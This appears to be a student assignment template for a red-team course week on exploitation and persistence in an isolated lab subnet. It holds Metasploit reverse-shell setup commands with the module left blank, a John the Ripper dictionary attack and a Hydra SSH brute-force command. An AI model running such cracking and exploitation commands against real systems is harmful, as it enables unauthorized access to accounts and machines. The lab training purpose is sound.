# ⚔️ Week 3 — Cracking & Attacking

> **NetworkWalks Academy | Batch B082 | August 2026**
>
> **Track:** Offensive (Red Team) — Phase 3 (Gaining Access) & Phase 4 (Maintaining Access)
>
> **Submission Deadline:** Friday, 11:59 PM Dubai Time

---

## 📋 Project Overview

Execute controlled exploitation, password cracking, and persistence workflows against vulnerable targets within the isolated `10.0.2.0/24` lab subnet.

---

## 🛠️ Tools & Frameworks

| Tool | Purpose | Primary Use Case |
|---|---|---|
| 💀 **Metasploit Framework** | Exploitation & Post-Exploitation | Payload delivery, shellcode execution, Meterpreter |
| 🔓 **John The Ripper (JTR)** | Offline Password Cracking | Dictionary and brute-force hash recovery |
| 🔑 **Hydra** | Online Authentication Attacks | Network login cracking (SSH, FTP, HTTP, RDP) |
| 🐍 **Custom Scripts** | Automation | Custom exploit delivery & shell interaction |

---

## 🎯 Lab Target Machines

> ⚠️ **All attacks performed strictly against owned lab machines on `10.0.2.0/24`.**

| Target Name | Target IP | Operating System | Vulnerable Services |
|---|---|---|---|
| **Metasploitable 2** | `10.0.2.x` | Ubuntu Linux (Vulnerable) | FTP, SSH, Telnet, SMB, HTTP |
| **Windows Target** | `10.0.2.x` | Windows Target | SMB, RDP, HTTP |

---

## 📝 Exploitation & Attack Documentation

### Attack 1: Metasploit Exploitation

**Target:** `10.0.2.x` | **Module:** `exploit/...`

```bash
msfconsole -q
use exploit/...
set RHOSTS 10.0.2.x
set LHOST 10.0.2.15
set LPORT 4444
exploit
```

**Evidence & Proof of Concept:**
<!-- Add screenshots and Meterpreter session output -->

---

### Attack 2: Offline Password Cracking (John The Ripper)

```bash
# Dictionary attack using rockyou.txt wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Display recovered credentials
john --show hashes.txt
```

---

### Attack 3: Online Service Brute-Force (Hydra)

```bash
# Example SSH credential testing
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.x ssh
```

---

## 🐞 Troubleshooting Log

| Issue Encountered | Root Cause | Resolution |
|---|---|---|
| | | |

---

## 💡 Key Takeaways & Learnings

1. [Exploitation fundamentals and payload staging]
2. [Password complexity impact on dictionary attack feasibility]
3. [Detection mechanisms for brute-force traffic]

---

## 🔐 Ethical Statement

> All exploitation was carried out strictly inside the isolated `10.0.2.0/24` lab environment for educational learning.

---

> 📂 [Back to Main README](../README.md)
